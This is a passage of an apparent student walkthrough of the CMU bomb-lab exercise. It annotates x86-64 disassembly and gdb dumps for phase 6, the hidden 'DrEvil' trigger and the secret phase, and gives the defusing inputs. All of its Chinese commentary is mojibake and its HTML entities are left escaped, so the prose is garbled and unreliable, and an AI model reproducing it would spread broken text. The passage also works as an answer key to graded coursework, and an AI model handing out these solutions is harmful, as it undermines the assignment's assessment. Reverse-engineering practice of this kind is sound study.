å°±æ˜¯è¦ä½¿å¾—æ‰€è¾“å…¥çš„å­—ç¬¦ä¸²çš„åå…­è¿›åˆ¶å–åå››ä½ï¼Œå¹¶ä½œä¸ºarrayæ•°ç»„çš„ä¸‹æ ‡ï¼Œè®©arrayæ•°ç»„ä¸ç›®æ ‡å­—ç¬¦ä¸²ç›¸ç­‰ã€‚\nç›®æ ‡å­—ç¬¦ä¸²åœ¨0x40245eå†…å­˜åœ°å€ä¸­ï¼Œå³0x666c79657273 \u0026ldquo;flyers\u0026rdquo;\narrayæ•°ç»„åœ¨0x4024b0å†…å­˜åœ°å€ä¸­,å¦‚ä¸‹æ‰€ç¤ºã€‚\n(gdb) x/16c 0x4024b0 0x4024b0 \u0026lt;array.3449\u0026gt;: 109 \u0026#39;m\u0026#39; 97 \u0026#39;a\u0026#39; 100 \u0026#39;d\u0026#39; 117 \u0026#39;u\u0026#39; 105 \u0026#39;i\u0026#39; 101 \u0026#39;e\u0026#39; 114 \u0026#39;r\u0026#39; 115 \u0026#39;s\u0026#39; 0x4024b8 \u0026lt;array.3449+8\u0026gt;: 110 \u0026#39;n\u0026#39; 102 \u0026#39;f\u0026#39; 111 \u0026#39;o\u0026#39; 116 \u0026#39;t\u0026#39; 118 \u0026#39;v\u0026#39; 98 \u0026#39;b\u0026#39; 121 \u0026#39;y\u0026#39; 108 \u0026#39;l\u0026#39; (gdb) x/s 0x40245e 0x40245e: \u0026#34;flyers\u0026#34; 0x4024b9 f 0x4024bf l 0x4024be y 0x4024b5 e 0x4024b6 r 0x4024b7 s arrayæ•°ç»„çš„è¡¨æ ¼å¦‚ä¸‹\narray[i]çš„i å¯¹åº”çš„char input[rax] 0 m 0x*0 1 a 0x*1 2 d 0x*2 3 u 0x*3 4 i 0x*4 5 e 0x*5 6 r 0x*6 7 s 0x*7 8 n 0x*8 9 f 0x*9 a o 0x*a b t 0x*b c v 0x*c d b 0x*d e y 0x*e f l 0x*f æ‰€ä»¥è¾“å…¥çš„å­—ç¬¦ä¸²åªéœ€æ‰¾åˆ°è¡¨æ ¼ä¸­å¯¹åº”flyerså­—ç¬¦ä¸²çš„input[rax]ä»»æ„ç»„åˆå³å¯ï¼Œæ¯”å¦‚ionefg(0x69 0x6f 0x6e 0x65 0x66 0x67)\nPhase_6 00000000004010f4 \u0026lt;phase_6\u0026gt;: 4010f4:\t41 56 push %r14 4010f6:\t41 55 push %r13 4010f8:\t41 54 push %r12 4010fa:\t55 push %rbp 4010fb:\t53 push %rbx 4010fc:\t48 83 ec 50 sub $0x50,%rsp //å…¥æ ˆï¼Œæ ˆæŒ‡é’ˆå‡å°‘80 401100:\t49 89 e5 mov %rsp,%r13 //r13=rsp 401103:\t48 89 e6 mov %rsp,%rsi //rsi=rsp 401106:\te8 51 03 00 00 call 40145c \u0026lt;read_six_numbers\u0026gt; //è¯»å–6ä¸ªæ•°å­— 40110b:\t49 89 e6 mov %rsp,%r14 //r14=rsp 40110e:\t41 bc 00 00 00 00 mov $0x0,%r12d //r12d=0 401114:\t4c 89 ed mov %r13,%rbp //rbp=r13 rsp rsp+4 401117:\t41 8b 45 00 mov 0x0(%r13),%eax //eax=*(r13) 40111b:\t83 e8 01 sub $0x1,%eax //eax=eax-1 40111e:\t83 f8 05 cmp $0x5,%eax //eaxä¸5æ¯”è¾ƒ 401121:\t76 05 jbe 401128 \u0026lt;phase_6+0x34\u0026gt; //è‹¥eax\u0026lt;=5ï¼Œè·³è½¬åˆ°0x401128 401123:\te8 12 03 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; //å¦åˆ™ï¼Œçˆ†ç‚¸ 401128:\t41 83 c4 01 add $0x1,%r12d //r12d=r12d+1=1 2 40112c:\t41 83 fc 06 cmp $0x6,%r12d //r12dä¸6æ¯”è¾ƒ 401130:\t74 21 je 401153 \u0026lt;phase_6+0x5f\u0026gt; //è‹¥r12d=6ï¼Œåˆ™è·³è½¬åˆ°0x401153 401132:\t44 89 e3 mov %r12d,%ebx //ebx=r12d=1 2 401135:\t48 63 c3 movslq %ebx,%rax //rax=ebx 1 2 401138:\t8b 04 84 mov (%rsp,%rax,4),%eax //eax=*(rsp+rax*4) 40113b:\t39 45 00 cmp %eax,0x0(%rbp) 40113e:\t75 05 jne 401145 \u0026lt;phase_6+0x51\u0026gt; //è‹¥*(rbp)!=*(rsp+rax*4),è·³è½¬åˆ°0x401145 401140:\te8 f5 02 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; //å¦åˆ™ï¼Œçˆ†ç‚¸ 401145:\t83 c3 01 add $0x1,%ebx //ebx++ 2 401148:\t83 fb 05 cmp $0x5,%ebx 40114b:\t7e e8 jle 401135 \u0026lt;phase_6+0x41\u0026gt; //è‹¥ebx\u0026lt;=5,è·³è½¬åˆ°0x401135 40114d:\t49 83 c5 04 add $0x4,%r13 //r13+=4 401151:\teb c1 jmp 401114 \u0026lt;phase_6+0x20\u0026gt; //è·³è½¬åˆ°0x401114 #è¿™æ®µä»£ç çš„ç›®çš„å°±æ˜¯è®©æ‰€æœ‰å‚æ•°è¦å°äºç­‰äº6ï¼Œå¹¶ä¸”ä¸å¾—é‡å¤ 401153:\t48 8d 74 24 18 lea 0x18(%rsp),%rsi //rsi=rsp+24 401158:\t4c 89 f0 mov %r14,%rax //rax=r14 rsp 40115b:\tb9 07 00 00 00 mov $0x7,%ecx //ecx=7 401160:\t89 ca mov %ecx,%edx //edx=ecx=7 401162:\t2b 10 sub (%rax),%edx //edx=edx-*(rax) 7-*(rsp) 401164:\t89 10 mov %edx,(%rax) //*(rax)=edx *(rsp)=7-*(rsp) 401166:\t48 83 c0 04 add $0x4,%rax //rax=rax+4 rsp+4 40116a:\t48 39 f0 cmp %rsi,%rax //raxä¸rsiæ¯”è¾ƒ 40116d:\t75 f1 jne 401160 \u0026lt;phase_6+0x6c\u0026gt; //è‹¥rax!=rsiï¼Œåˆ™è·³è½¬åˆ°0x401160 å…­æ¬¡å¾ªç¯ #è¿™æ®µä»£ç å°±æ˜¯å¤„ç†å‚æ•° #ç›¸å½“äºfor(int i=0;i\u0026lt;6;i++){ #input[i]=7-input[i]; #} 40116f:\tbe 00 00 00 00 mov $0x0,%esi //esi=0 401174:\teb 21 jmp 401197 \u0026lt;phase_6+0xa3\u0026gt; //è·³è½¬åˆ°0x401197 401176:\t48 8b 52 08 mov 0x8(%rdx),%rdx //rdx=*(rdx+8) *(0x6032d0+8) 40117a:\t83 c0 01 add $0x1,%eax //eax++ 2 40117d:\t39 c8 cmp %ecx,%eax //æ¯”è¾ƒecxå’Œeaxçš„å¤§å° *(rsp)ä¸2å¤§å° 40117f:\t75 f5 jne 401176 \u0026lt;phase_6+0x82\u0026gt; //è‹¥ecx!=eaxï¼Œåˆ™è·³è½¬åˆ°0x401176 401181:\teb 05 jmp 401188 \u0026lt;phase_6+0x94\u0026gt; //è·³è½¬åˆ°0x401188 401183:\tba d0 32 60 00 mov $0x6032d0,%edx //edx=0x6032d0 401188:\t48 89 54 74 20 mov %rdx,0x20(%rsp,%rsi,2) //*(rsp+rsi*2+32)=rdx 40118d:\t48 83 c6 04 add $0x4,%rsi //rsi=rsi+4 4 401191:\t48 83 fe 18 cmp $0x18,%rsi //rsiä¸24æ¯”è¾ƒ 401195:\t74 14 je 4011ab \u0026lt;phase_6+0xb7\u0026gt; //è‹¥rsi=24ï¼Œè·³è½¬åˆ°0x4011ab 401197:\t8b 0c 34 mov (%rsp,%rsi,1),%ecx //ecx=*(rsp+rsi) æŒ‡é’ˆåç§»ï¼Œä¾æ¬¡è·å–6ä¸ªæ•° *(rsp) *(rsp+4) 40119a:\t83 f9 01 cmp $0x1,%ecx //æ¯”è¾ƒecxä¸1çš„å¤§å° 40119d:\t7e e4 jle 401183 \u0026lt;phase_6+0x8f\u0026gt; //è‹¥ecx\u0026lt;=1ï¼Œè·³è½¬åˆ°0x401183 å³å½“å¤„ç†åçš„*(rsp)=1æ—¶ 40119f:\tb8 01 00 00 00 mov $0x1,%eax //eax=1 4011a4:\tba d0 32 60 00 mov $0x6032d0,%edx //edx=0x6032d0 4011a9:\teb cb jmp 401176 \u0026lt;phase_6+0x82\u0026gt; //è·³è½¬åˆ°0x401176 #è¿™æ®µä»£ç ä¸å¤ªå¥½ç€æ‰‹ï¼Œæ ¹æ®æˆ‘ä»¬è¾“å…¥çš„1 2 3 4 5 6å¸¦å…¥è¿è¡Œï¼Œç»è¿‡ä¹‹å‰çš„å¤„ç†åç¼–ç¨‹äº†6 5 4 3 2 1ï¼Œ #è¿™æ®µä»£ç çš„å…³é”®åœ¨äº0x6032d0è¿™ä¸ªåœ°å€ä»£è¡¨çš„å«ä¹‰ï¼Œ #åœ¨å¤„ç†ç¬¬ä¸€ä¸ªå‚æ•°6æ—¶ï¼Œå‘ç°åœ¨ä¸æ–­åµŒå¥—ä½¿ç”¨åœ°å€ï¼Œä¼˜ç‚¹åƒé“¾è¡¨ï¼Œåˆ©ç”¨gdbæŸ¥çœ‹ï¼Œè¿™ä¸ªåœ°å€çš„å€¼å‘ç°ï¼š #(gdb) x/24w 0x6032d0 #0x6032d0 \u0026lt;node1\u0026gt;: 0x0000014c 0x00000001 0x006032e0 0x00000000 #0x6032e0 \u0026lt;node2\u0026gt;: 0x000000a8 0x00000002 0x006032f0 0x00000000 #0x6032f0 \u0026lt;node3\u0026gt;: 0x0000039c 0x00000003 0x00603300 0x00000000 #0x603300 \u0026lt;node4\u0026gt;: 0x000002b3 0x00000004 0x00603310 0x00000000 #0x603310 \u0026lt;node5\u0026gt;: 0x000001dd 0x00000005 0x00603320 0x00000000 #0x603320 \u0026lt;node6\u0026gt;: 0x000001bb 0x00000006 0x00000000 0x00000000 #åœ¨è¿™é‡Œï¼Œæˆ‘çš„è¾“å…¥æ˜¯1 2 3 4 5 6 #æˆ‘ä»¬çœ‹åˆ°æ‰“å°å‡ºæ¥çš„ç»“æœï¼Œæ¯ä¸ªnodeé‡Œç¬¬2ä¸ªå››å­—èŠ‚çš„éƒ¨åˆ†å’Œæˆ‘ä»¬çš„è¾“å…¥å»åˆï¼› #è€Œç¬¬ä¸‰ä¸ªå››å­—èŠ‚çš„éƒ¨åˆ†åˆ™æ˜¯ä¸‹ä¸€ä¸ªnodeçš„èµ·å§‹åœ°å€ï¼Œæœ€åä¸€ä¸ªå››å­—èŠ‚çš„éƒ¨åˆ†åˆ™ä¸º0ï¼Œ #è€ƒè™‘åˆ°å†…å­˜å¯¹é½ï¼Œæˆ‘ä»¬å¤§æ¦‚èƒ½æ¨æµ‹å‡ºï¼Œè¿™åº”è¯¥æ˜¯ä¸€ä¸ªé“¾è¡¨ï¼Œè€Œæˆ‘ä»¬çš„è¾“å…¥çš„æ•°å­—ä¸åœ¨ç¬¬äºŒä¸ªå››å­—èŠ‚çš„åœ°æ–¹çš„æ•°æ®æœ‰å…³ï¼Œ #ç¬¬ä¸€ä¸ªå››å­—èŠ‚çš„å†…å®¹è¡¨ç¤ºçš„æ˜¯ä»€ä¹ˆå¾…ç¡®å®š # è¿™ä¸ªç»“æ„ä½“æœ‰ç‚¹ç±»ä¼¼é“¾è¡¨ï¼š # struct { # int sth; // æŸå››å­—èŠ‚å†…å®¹ # int input; // ä¸æˆ‘ä»¬çš„è¾“å…¥æœ‰å…³ # node* next; // ä¸‹ä¸€ä¸ªnodeåœ°å€ # } node; #è¿™ä¹ˆçœ‹ä¸‹æ¥è¿™æ®µä»£ç å°±æ˜¯å°†å¤„ç†åå‚æ•°æ‰€å¯¹åº”nodeçš„èµ·å§‹åœ°å€å­˜å‚¨åˆ°é¦–åœ°å€ä¸ºrsp+0x20ï¼Œå°¾åœ°å€ä¸ºrsp+0x50çš„åœ°æ–¹ #(gdb) x/12w $rsp+0x20 #0x7fffffffd8c0: 0x00603320 0x00000000 0x00603310 0x00000000 #0x7fffffffd8d0: 0x00603300 0x00000000 0x006032f0 0x00000000 #0x7fffffffd8e0: 0x006032e0 0x00000000 0x006032d0 0x00000000 4011ab:\t48 8b 5c 24 20 mov 0x20(%rsp),%rbx //rbx=*(rsp+0x20) 0x00603320 4011b0:\t48 8d 44 24 28 lea 0x28(%rsp),%rax //rax=(rsp+0x28) 4011b5:\t48 8d 74 24 50 lea 0x50(%rsp),%rsi //rsi=(rsp+0x50) 4011ba:\t48 89 d9 mov %rbx,%rcx //rcx=rbx=*(rsp+0x20) 0x00603320 4011bd:\t48 8b 10 mov (%rax),%rdx //rdx=*(rax)=*(rsp+0x28) 0x00603310 4011c0:\t48 89 51 08 mov %rdx,0x8(%rcx) //*(rcx+8)=rdx *(*(rsp+0x20)+8)=*(rsp+0x28) //*0x00603328=0x00603310 *0x00603318=0x603300 4011c4:\t48 83 c0 08 add $0x8,%rax //rax+=8 (rsp+0x30) 4011c8:\t48 39 f0 cmp %rsi,%rax 4011cb:\t74 05 je 4011d2 \u0026lt;phase_6+0xde\u0026gt; //è‹¥rax=rsi,è·³è½¬åˆ°0x4011d2 4011cd:\t48 89 d1 mov %rdx,%rcx //rcx=rdx *(rsp+0x28) 4011d0:\teb eb jmp 4011bd \u0026lt;phase_6+0xc9\u0026gt; //è·³è½¬åˆ°0x4011bd #è¿™æ®µä»£ç å¯ä»¥ç®€åŒ–ä¸ºä¸€ä¸ªforå¾ªç¯ï¼Œè¿™ä¸ªå¾ªç¯ç”¨æ¥å°†é“¾è¡¨çš„ç»“ç‚¹é‡æ–°è°ƒæ•´è‡³ç¬¬ä¸€ä¸ªå‚æ•°çš„ç»“ç‚¹ä¸ºå¤´èŠ‚ç‚¹ï¼Œ #åé¢çš„å‚æ•°ä¾æ¬¡é“¾æ¥åœ¨è¿™ä¸ªå¤´ç»“ç‚¹åçš„é“¾è¡¨ï¼š #for(int i=0;i\u0026lt;6;i++){ #node[i]-\u0026gt;next=node[i+1]; #} #ç»“æœå¦‚ä¸‹ #(gdb) x/24w 0x6032d0 #0x6032d0 \u0026lt;node1\u0026gt;: 0x0000014c 0x00000001 0x006032e0 0x00000000 #0x6032e0 \u0026lt;node2\u0026gt;: 0x000000a8 0x00000002 0x006032d0 0x00000000 #0x6032f0 \u0026lt;node3\u0026gt;: 0x0000039c 0x00000003 0x006032e0 0x00000000 #0x603300 \u0026lt;node4\u0026gt;: 0x000002b3 0x00000004 0x006032f0 0x00000000 #0x603310 \u0026lt;node5\u0026gt;: 0x000001dd 0x00000005 0x00603300 0x00000000 #0x603320 \u0026lt;node6\u0026gt;: 0x000001bb 0x00000006 0x00603310 0x00000000 4011d2:\t48 c7 42 08 00 00 00 movq $0x0,0x8(%rdx) ///*(rdx+8)=0 4011d9:\t00 4011da:\tbd 05 00 00 00 mov $0x5,%ebp //ebp=5 4011df:\t48 8b 43 08 mov 0x8(%rbx),%rax //rax=*(rbx+8)=å¤´ç»“ç‚¹çš„ä¸‹ä¸€ä¸ªç»“ç‚¹rbx=*(rsp+0x20) 4011e3:\t8b 00 mov (%rax),%eax //eax=*(rax) ä¸‹ä¸€ç»“ç‚¹çš„sthå†…å®¹ 4011e5:\t39 03 cmp %eax,(%rbx) //å½“å‰ç»“ç‚¹çš„sthä¸ä¸‹ä¸€ç»“ç‚¹çš„sthå†…å®¹æ¯”è¾ƒ 4011e7:\t7d 05 jge 4011ee \u0026lt;phase_6+0xfa\u0026gt; //è‹¥*(rbx)\u0026gt;=eaxï¼Œåˆ™è·³è½¬åˆ°0x4011ee 4011e9:\te8 4c 02 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; //å¦åˆ™ï¼Œçˆ†ç‚¸ 4011ee:\t48 8b 5b 08 mov 0x8(%rbx),%rbx //rbx=*(rbx+8) æŒ‡å‘ä¸‹ä¸€ä¸ªç»“ç‚¹ 4011f2:\t83 ed 01 sub $0x1,%ebp //ebp-- 4011f5:\t75 e8 jne 4011df \u0026lt;phase_6+0xeb\u0026gt; //è‹¥ä¸ç­‰äº0ï¼Œåˆ™è·³è½¬åˆ°0x4011df 4011f7:\t48 83 c4 50 add $0x50,%rsp //å‡ºæ ˆï¼Œæ ˆæŒ‡é’ˆå¢åŠ 80 #è¿™æ®µä»£ç ä¸»è¦æ˜¯æ¯”è¾ƒæ¯ä¸ªç»“ç‚¹å’Œä¸‹ä¸€ä¸ªç»“ç‚¹çš„sthå€¼(ç»“ç‚¹çš„é¦–å››å­—èŠ‚å†…å®¹)ï¼Œå½“å‰ç»“ç‚¹çš„sthè¦å¤§äºç­‰äºä¸‹ä¸€ç»“ç‚¹çš„sthï¼Œ #æ‰€ä»¥æˆ‘ä»¬éœ€è¦å°†sthçš„å€¼æ’åºä»å¤§åˆ°å°æ’åº,æ’åºåæ‰€ç»“ç‚¹å¯¹åº”åºå·çš„åºåˆ—å°±æ˜¯æˆ‘ä»¬è¦è¾“å…¥çš„å‚æ•°å€¼å’Œå¯¹åº”é¡ºåºï¼Œ #å³4 3 2 1 6 5 æ³¨æ„å‚æ•°è¢«å¤„ç†è¿‡ï¼Œä¸è¦å†™æˆ3 4 5 6 1 2 4011fb:\t5b pop %rbx 4011fc:\t5d pop %rbp 4011fd:\t41 5c pop %r12 4011ff:\t41 5d pop %r13 401201:\t41 5e pop %r14 401203:\tc3 ret æ³¨é‡Šä¸­ä¸€èˆ¬éƒ½åªå†™äº†ç¬¬ä¸€æ¬¡å¾ªç¯å„å¯„å­˜å™¨æ‰€å¯¹åº”çš„å€¼ï¼Œè‹¥æœ‰å¤šä¸ªå€¼åˆ™æ˜¯å¾ªç¯äº†å¤šæ¬¡ï¼Œä¸€èˆ¬å¾ªç¯ä¸¤ä¸‰æ¬¡å°±èƒ½çœ‹å‡ºæ•´ä¸ªå‡½æ•°çš„ç”¨æ„ã€‚æ•´ä¸ªphase_6è°ƒè¯•æ‰€è¾“å…¥çš„å‚æ•°ä¸º1 2 3 4 5 6\nBonus 00000000004015c4 \u0026lt;phase_defused\u0026gt;: 4015c4:\t48 83 ec 78 sub $0x78,%rsp 4015c8:\t64 48 8b 04 25 28 00 mov %fs:0x28,%rax 4015cf:\t00 00 4015d1:\t48 89 44 24 68 mov %rax,0x68(%rsp) 4015d6:\t31 c0 xor %eax,%eax 4015d8:\t83 3d 81 21 20 00 06 cmpl $0x6,0x202181(%rip) # 603760 \u0026lt;num_input_strings\u0026gt; 4015df:\t75 5e jne 40163f \u0026lt;phase_defused+0x7b\u0026gt; 4015e1:\t4c 8d 44 24 10 lea 0x10(%rsp),%r8 4015e6:\t48 8d 4c 24 0c lea 0xc(%rsp),%rcx 4015eb:\t48 8d 54 24 08 lea 0x8(%rsp),%rdx 4015f0:\tbe 19 26 40 00 mov $0x402619,%esi #åœ°å€çš„å€¼æ˜¯\u0026#34;%d %d %s\u0026#34; 4015f5:\tbf 70 38 60 00 mov $0x603870,%edi #åœ°å€çš„å€¼æ˜¯\u0026#34;7 0\u0026#34;è¿™æ­£æ˜¯ç¬¬4å…³çš„keyï¼Œæ¨æµ‹ä»è¿™å…³è¿›å…¥å½©è›‹ 4015fa:\te8 f1 f5 ff ff call 400bf0 \u0026lt;__isoc99_sscanf@plt\u0026gt; 4015ff:\t83 f8 03 cmp $0x3,%eax 401602:\t75 31 jne 401635 \u0026lt;phase_defused+0x71\u0026gt; #eax!=3ï¼Œå°±è·³è½¬åˆ°æœ«å°¾ 401604:\tbe 22 26 40 00 mov $0x402622,%esi #esi=0x402622 è¯¥åœ°å€å¯¹åº”\u0026#34;DrEvil\u0026#34; 401609:\t48 8d 7c 24 10 lea 0x10(%rsp),%rdi #rdi=*(rsp+16) 40160e:\te8 25 fd ff ff call 401338 \u0026lt;strings_not_equal\u0026gt; #åˆ¤æ–­å­—ç¬¦ä¸²æ˜¯å¦ç›¸ç­‰ 401613:\t85 c0 test %eax,%eax 401615:\t75 1e jne 401635 \u0026lt;phase_defused+0x71\u0026gt; #å¦‚æœä¸ç­‰ï¼Œå°±è·³è½¬åˆ°æœ«å°¾ 401617:\tbf f8 24 40 00 mov $0x4024f8,%edi 40161c:\te8 ef f4 ff ff call 400b10 \u0026lt;puts@plt\u0026gt; 401621:\tbf 20 25 40 00 mov $0x402520,%edi 401626:\te8 e5 f4 ff ff call 400b10 \u0026lt;puts@plt\u0026gt; 40162b:\tb8 00 00 00 00 mov $0x0,%eax 401630:\te8 0d fc ff ff call 401242 \u0026lt;secret_phase\u0026gt; #å› æ­¤è¿›å…¥å½©è›‹éœ€è¦åœ¨ç¬¬4å…³çš„ç­”æ¡ˆåé¢æ·»ä¸Š\u0026#34;DrEvil\u0026#34;å­—ç¬¦ä¸² 401635:\tbf 58 25 40 00 mov $0x402558,%edi 40163a:\te8 d1 f4 ff ff call 400b10 \u0026lt;puts@plt\u0026gt; 40163f:\t48 8b 44 24 68 mov 0x68(%rsp),%rax 401644:\t64 48 33 04 25 28 00 xor %fs:0x28,%rax 40164b:\t00 00 40164d:\t74 05 je 401654 \u0026lt;phase_defused+0x90\u0026gt; 40164f:\te8 dc f4 ff ff call 400b30 \u0026lt;__stack_chk_fail@plt\u0026gt; 401654:\t48 83 c4 78 add $0x78,%rsp 401658:\tc3 ret 0000000000401204 \u0026lt;fun7\u0026gt;: 401204:\t48 83 ec 08 sub $0x8,%rsp 401208:\t48 85 ff test %rdi,%rdi 40120b:\t74 2b je 401238 \u0026lt;fun7+0x34\u0026gt; #è‹¥rdi=0ï¼Œåˆ™è·³è½¬ 40120d:\t8b 17 mov (%rdi),%edx #edx=*(rdi)=0x24 40120f:\t39 f2 cmp %esi,%edx 401211:\t7e 0d jle 401220 \u0026lt;fun7+0x1c\u0026gt; #è‹¥edx\u0026lt;=esiï¼Œåˆ™è·³è½¬ 401213:\t48 8b 7f 08 mov 0x8(%rdi),%rdi #rdi=*(rdi+8) 401217:\te8 e8 ff ff ff call 401204 \u0026lt;fun7\u0026gt; func7(0x00603110,input) 40121c:\t01 c0 add %eax,%eax 40121e:\teb 1d jmp 40123d \u0026lt;fun7+0x39\u0026gt; 401220:\tb8 00 00 00 00 mov $0x0,%eax #eax=0 401225:\t39 f2 cmp %esi,%edx 401227:\t74 14 je 40123d \u0026lt;fun7+0x39\u0026gt; #è‹¥edx=esiï¼Œåˆ™è·³è½¬ inputä¸èƒ½ç­‰äº0x24 401229:\t48 8b 7f 10 mov 0x10(%rdi),%rdi #rdi=*(rdi+16) 40122d:\te8 d2 ff ff ff call 401204 \u0026lt;fun7\u0026gt; 401232:\t8d 44 00 01 lea 0x1(%rax,%rax,1),%eax #eax=rax+rax+1 401236:\teb 05 jmp 40123d \u0026lt;fun7+0x39\u0026gt; #è·³è½¬ 401238:\tb8 ff ff ff ff mov $0xffffffff,%eax 40123d:\t48 83 c4 08 add $0x8,%rsp 401241:\tc3 ret #ç­‰ä»·cè¯­è¨€ï¼š int fun7(int input, Node* addr){ if(addr == 0){ return -1; } int v = addr-\u0026gt;value; if (v == input){ return 0; }else if( v \u0026lt; input){ return 1 + 2*fun7(input, addr-\u0026gt;right); }else{ return 2*func7(input, addr-\u0026gt;left); } } #çºµè§‚eaxå€¼çš„è®¾ç½®ï¼Œä¸€å…±æœ‰ä¸‰å¤„ï¼Œesi\u0026lt;edxæ—¶ï¼Œeax=2*eaxï¼› esi=edxæ—¶ï¼Œeax=0ï¼›esi\u0026gt;edxæ—¶ï¼Œeax=rax+rax+1ï¼Œåœ¨å®ƒä»¬çš„å‰é¢è¿˜ä¼šåµŒå¥—è°ƒç”¨func7 #è‹¥æƒ³è®©eax=2ï¼Œé‚£ä¹ˆåªæœ‰è®©æœ€æ·±å±‚çš„func7è°ƒç”¨eax=0ï¼Œç„¶åè°ƒç”¨eax=rax+rax+1ï¼Œæœ€åæœ€å¤–é¢è¿™å±‚func7å‡½æ•°è°ƒç”¨eax=2*eaxï¼Œè¿™æ ·åˆšå¥½ç­‰äº2 #æ‰€ä»¥input\u0026lt;0x24 input\u0026gt;0x8 input=0x16 #è¿™é‡Œçš„è®¾ç½®ä¸phase_6çš„è®¾ç½®æœ‰äº›ç±»ä¼¼ï¼Œæ¶‰åŠåˆ°äº†åœ°å€åµŒå¥—è°ƒç”¨ï¼Œä½¿ç”¨gdbæŸ¥çœ‹ç›¸åº”çš„å†…å­˜åœ°å€èŒƒå›´çš„å€¼ï¼Œä¸€ç›®äº†ç„¶ã€‚ #(gdb) x/120w 0x6030f0 #0x6030f0 \u0026lt;n1\u0026gt;: 0x00000024 0x00000000 0x00603110 0x00000000 #0x603100 \u0026lt;n1+16\u0026gt;: 0x00603130 0x00000000 0x00000000 0x00000000 #0x603110 \u0026lt;n21\u0026gt;: 0x00000008 0x00000000 0x00603190 0x00000000 #0x603120 \u0026lt;n21+16\u0026gt;: 0x00603150 0x00000000 0x00000000 0x00000000 #0x603130 \u0026lt;n22\u0026gt;: 0x00000032 0x00000000 0x00603170 0x00000000 #0x603140 \u0026lt;n22+16\u0026gt;: 0x006031b0 0x00000000 0x00000000 0x00000000 #0x603150 \u0026lt;n32\u0026gt;: 0x00000016 0x00000000 0x00603270 0x00000000 #0x603160 \u0026lt;n32+16\u0026gt;: 0x00603230 0x00000000 0x00000000 0x00000000 #0x603170 \u0026lt;n33\u0026gt;: 0x0000002d 0x00000000 0x006031d0 0x00000000 #0x603180 \u0026lt;n33+16\u0026gt;: 0x00603290 0x00000000 0x00000000 0x00000000 #0x603190 \u0026lt;n31\u0026gt;: 0x00000006 0x00000000 0x006031f0 0x00000000 #0x6031a0 \u0026lt;n31+16\u0026gt;: 0x00603250 0x00000000 0x00000000 0x00000000 #0x6031b0 \u0026lt;n34\u0026gt;: 0x0000006b 0x00000000 0x00603210 0x00000000 #0x6031c0 \u0026lt;n34+16\u0026gt;: 0x006032b0 0x00000000 0x00000000 0x00000000 #0x6031d0 \u0026lt;n45\u0026gt;: 0x00000028 0x00000000 0x00000000 0x00000000 #0x6031e0 \u0026lt;n45+16\u0026gt;: 0x00000000 0x00000000 0x00000000 0x00000000 #0x6031f0 \u0026lt;n41\u0026gt;: 0x00000001 0x00000000 0x00000000 0x00000000 #0x603200 \u0026lt;n41+16\u0026gt;: 0x00000000 0x00000000 0x00000000 0x00000000 #0x603210 \u0026lt;n47\u0026gt;: 0x00000063 0x00000000 0x00000000 0x00000000 #0x603220 \u0026lt;n47+16\u0026gt;: 0x00000000 0x00000000 0x00000000 0x00000000 #0x603230 \u0026lt;n44\u0026gt;: 0x00000023 0x00000000 0x00000000 0x00000000 #0x603240 \u0026lt;n44+16\u0026gt;: 0x00000000 0x00000000 0x00000000 0x00000000 #0x603250 \u0026lt;n42\u0026gt;: 0x00000007 0x00000000 0x00000000 0x00000000 #0x603260 \u0026lt;n42+16\u0026gt;: 0x00000000 0x00000000 0x00000000 0x00000000 #0x603270 \u0026lt;n43\u0026gt;: 0x00000014 0x00000000 0x00000000 0x00000000 #0x603280 \u0026lt;n43+16\u0026gt;: 0x00000000 0x00000000 0x00000000 0x00000000 #0x603290 \u0026lt;n46\u0026gt;: 0x0000002f 0x00000000 0x00000000 0x00000000 #0x6032a0 \u0026lt;n46+16\u0026gt;: 0x00000000 0x00000000 0x00000000 0x00000000 #0x6032b0 \u0026lt;n48\u0026gt;: 0x000003e9 0x00000000 0x00000000 0x00000000 #0x6032c0 \u0026lt;n48+16\u0026gt;: 0x00000000 0x00000000 0x00000000 0x00000000 0000000000401242 \u0026lt;secret_phase\u0026gt;: 401242:\t53 push %rbx 401243:\te8 56 02 00 00 call 40149e \u0026lt;read_line\u0026gt; 401248:\tba 0a 00 00 00 mov $0xa,%edx #edx=10 ç¬¬ä¸‰ä¸ªå‚æ•° 40124d:\tbe 00 00 00 00 mov $0x0,%esi #esi=0 ç¬¬äºŒä¸ªå‚æ•° 401252:\t48 89 c7 mov %rax,%rdi #rdi=rax ç¬¬ä¸€ä¸ªå‚æ•° 401255:\te8 76 f9 ff ff call 400bd0 \u0026lt;strtol@plt\u0026gt; #å°†å­—ç¬¦ä¸²è½¬ä¸ºé•¿æ•´å‹ 40125a:\t48 89 c3 mov %rax,%rbx #rbx=rax 40125d:\t8d 40 ff lea -0x1(%rax),%eax #eax=rax-1 401260:\t3d e8 03 00 00 cmp $0x3e8,%eax #eaxä¸1000æ¯”è¾ƒ 401265:\t76 05 jbe 40126c \u0026lt;secret_phase+0x2a\u0026gt; #è‹¥eax\u0026lt;=1000,åˆ™è·³è½¬åˆ°0x40126c 401267:\te8 ce 01 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; #å¦åˆ™ï¼Œçˆ†ç‚¸ 40126c:\t89 de mov %ebx,%esi #esi=ebx ç¬¬äºŒä¸ªå‚æ•°ä¸ºè½¬åŒ–åçš„é•¿æ•´å‹æ•°å­— 40126e:\tbf f0 30 60 00 mov $0x6030f0,%edi #edi=0x6930f0 ç¬¬ä¸€ä¸ªå‚æ•° 401273:\te8 8c ff ff ff call 401204 \u0026lt;fun7\u0026gt; 401278:\t83 f8 02 cmp $0x2,%eax #æ¯”è¾ƒeaxå’Œ2 40127b:\t74 05 je 401282 \u0026lt;secret_phase+0x40\u0026gt; #è‹¥eax=2ï¼Œè·³è½¬åˆ°0x401282,æ‰€ä»¥func7å‡½æ•°è¿”å›å€¼å¿…é¡»è¦ç­‰äº2 40127d:\te8 b8 01 00 00 call 40143a \u0026lt;explode_bomb\u0026gt; #å¦åˆ™ï¼Œçˆ†ç‚¸ 401282:\tbf 38 24 40 00 mov $0x402438,%edi #edi=0x402438 401287:\te8 84 f8 ff ff call 400b10 \u0026lt;puts@plt\u0026gt; 40128c:\te8 33 03 00 00 call 4015c4 \u0026lt;phase_defused\u0026gt; 401291:\t5b pop %rbx 